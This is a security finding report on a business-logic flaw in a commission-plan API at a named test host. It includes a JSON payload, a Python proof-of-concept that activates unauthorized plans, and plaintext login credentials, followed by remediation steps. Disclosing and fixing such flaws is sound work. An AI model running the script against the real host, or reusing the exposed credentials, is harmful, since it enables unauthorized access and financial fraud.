# Business Logic Flaw: Commission Plan State Manipulation Enables Unauthorized Activation

**ID:** vuln-0045
**Severity:** CRITICAL
**Found:** 2026-02-26 19:40:50 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/CommissionPlan/CreateCommissionPlan
**Method:** POST
**CWE:** CWE-840
**CVSS:** 9.9

## Description

A critical business logic vulnerability was discovered in the commission plan state management that allows attackers to bypass approval workflows and activate commission plans without proper authorization.

The vulnerability exists in the `/api/CommissionPlan/CreateCommissionPlan` endpoint, which accepts a client-controlled `isActive` parameter that determines the commission plan's state. The application fails to enforce proper state transition validation, allowing attackers to create immediately active commission plans without following the intended approval workflow.

An attacker with Organization-level access can:
1. Create commission plans with `isActive: true` parameter
2. Bypass all approval workflows
3. Activate commission plans without proper authorization
4. Manipulate commission calculations and payouts

## Impact

Successful exploitation of this vulnerability allows attackers to:

1. **Financial Fraud**: Create and activate unauthorized commission plans that manipulate payout calculations
2. **Workflow Bypass**: Completely bypass intended approval processes for commission plans
3. **Unauthorized Data Modification**: Modify commission structures without proper authorization
4. **Business Process Compromise**: Circumvent intended business controls and validation steps
5. **Regulatory Compliance Violations**: Create commission plans that violate organizational policies and regulatory requirements

The financial impact could be severe, potentially resulting in:
- Unauthorized commission payouts
- Manipulated commission calculations
- Financial reporting inaccuracies
- Regulatory compliance violations
- Significant monetary losses through unauthorized commission structures

## Technical Analysis

The vulnerability exists due to improper state management in the commission plan creation process:

1. **Client-Controlled State**: The `isActive` parameter is accepted from client requests without validation
2. **Missing State Transition Validation**: No validation exists to enforce proper state transitions
3. **Missing Approval Workflow Enforcement**: Approval workflows can be bypassed by setting `isActive: true`
4. **Missing Business Rule Validation**: No validation exists to enforce business rules for commission plan activation

The `/api/CommissionPlan/CreateCommissionPlan` endpoint accepts JSON payloads with an `isActive` parameter that is directly processed without proper validation against the intended workflow. The application relies on client-side controls to enforce state transitions, which can be easily bypassed.

## Proof of Concept

**Reproduction Steps:**

1. Authenticate as an Organization user (nlnarayana3858@gmail.com / User@1234)
2. Capture the authentication token from the `/api/authenticate` response
3. Send a POST request to `/api/CommissionPlan/CreateCommissionPlan` with `isActive: true`:

```json
{
  "planName": "Unauthorized Active Plan",
  "planDescription": "Plan created bypassing approval workflow",
  "commissionPercentage": 10,
  "isActive": true,  // This bypasses the approval workflow
  "startDate": "2024-01-01",
  "endDate": "2024-12-31",
  "orgId": "current_org_id",
  "clientId": null
}
```

4. Observe that the commission plan is created and immediately active
5. Verify by calling `/api/commission-plan/get-all` that the plan shows as active
6. Confirm that no approval workflow was triggered

**Alternative Exploitation:**
1. Authenticate as an Organization user
2. Use a proxy to intercept the commission plan creation request
3. Modify the `isActive` parameter from `false` to `true`
4. Forward the modified request
5. Observe that the plan is created in active state

```
import requests
import json

# Configuration
BASE_URL = "https://commissionstest.callippus.in"
AUTH_ENDPOINT = f"{BASE_URL}/api/authenticate"
COMMISSION_PLAN_ENDPOINT = f"{BASE_URL}/api/CommissionPlan/CreateCommissionPlan"
COMMISSION_PLAN_LIST_ENDPOINT = f"{BASE_URL}/api/commission-plan/get-all"

# Organization user credentials
CREDENTIALS = {
    "username": "nlnarayana3858@gmail.com",
    "password": "User@1234"
}

# Step 1: Authenticate and get JWT token
auth_response = requests.post(AUTH_ENDPOINT, json=CREDENTIALS)
auth_data = auth_response.json()
jwt_token = auth_data['id_token']

headers = {
    "Authorization": f"Bearer {jwt_token}",
    "Content-Type": "application/json"
}

# Step 2: Create commission plan bypassing approval workflow
def create_unauthorized_active_plan():
    unauthorized_plan = {
        "planName": "Exploit - Unauthorized Activation",
        "planDescription": "Commission plan created bypassing approval workflow",
        "commissionPercentage": 15,
        "isActive": True,  # This bypasses the approval workflow
        "startDate": "2024-01-01",
        "endDate": "2024-12-31",
        "orgId": "current_org_id",  # Would be replaced with actual org ID
        "clientId": None
    }

    response = requests.post(COMMISSION_PLAN_ENDPOINT, headers=headers, json=unauthorized_plan)

    if response.status_code == 200:
        print("SUCCESS: Commission plan created bypassing approval workflow")
        plan_data = response.json()
        print(f"Plan ID: {plan_data.get('id')}")
        print(f"Plan Name: {plan_data.get('planName')}")
        print(f"Plan Status: {'ACTIVE' if plan_data.get('isActive') else 'INACTIVE'}")

        # Step 3: Verify the plan is active
        list_response = requests.get(COMMISSION_PLAN_LIST_ENDPOINT, headers=headers)
        if list_response.status_code == 200:
            plans = list_response.json()
            for plan in plans:
                if plan.get('planName') == "Exploit - Unauthorized Activation":
                    print(f"\nVerification - Plan found in active plans:")
                    print(f"Plan ID: {plan.get('id')}")
                    print(f"Plan Status: {'ACTIVE' if plan.get('isActive') else 'INACTIVE'}")
                    print("\nThis demonstrates complete bypass of the approval workflow")
                    return True
        else:
            print(f"Failed to verify plan: {list_response.status_code} - {list_response.text}")
    else:
        print(f"FAILED: {response.status_code} - {response.text}")
        return False

    return False

if __name__ == "__main__":
    print("Testing Commission Plan State Manipulation Vulnerability")
    print("=" * 60)

    success = create_unauthorized_active_plan()

    if success:
        print("\nCRITICAL IMPACT: Successfully demonstrated state manipulation vulnerability")
        print("This enables unauthorized activation of commission plans and financial fraud")
    else:
        print("\nNo state manipulation vulnerability confirmed")
```

## Remediation

**Immediate Remediation Steps:**

1. **Remove Client-Controlled State Parameter**:
   - Remove the `isActive` parameter from the commission plan creation API
   - Implement server-side state management for commission plans

2. **Implement Proper State Transitions**:
   - Create commission plans in a "draft" or "pending approval" state by default
   - Implement a separate approval endpoint for activating plans
   - Enforce proper state transition validation

3. **Implement Approval Workflow**:
   - Create a multi-step approval process for commission plan activation
   - Implement proper authorization checks for approval actions
   - Add audit logging for all state changes

4. **Add Server-Side Validation**:
   - Validate that commission plans can only be activated through the proper approval workflow
   - Implement state machine validation for commission plans
   - Add validation to prevent direct activation during creation

**Short-Term Actions:**
1. Implement comprehensive audit logging for all commission plan state changes
2. Add alerts for commission plans that bypass approval workflows
3. Implement role-based access control for commission plan activation
4. Conduct a security review of all state management in the application

**Long-Term Recommendations:**
1. Implement a comprehensive commission management workflow with multiple approval steps
2. Add role-based access control for commission plan management
3. Implement change tracking for all commission plan modifications
4. Conduct regular security testing of commission-related functionality
5. Implement financial controls to detect and prevent commission manipulation
6. Add comprehensive logging and alerting for commission processing
7. Implement integration with identity management systems for proper authorization

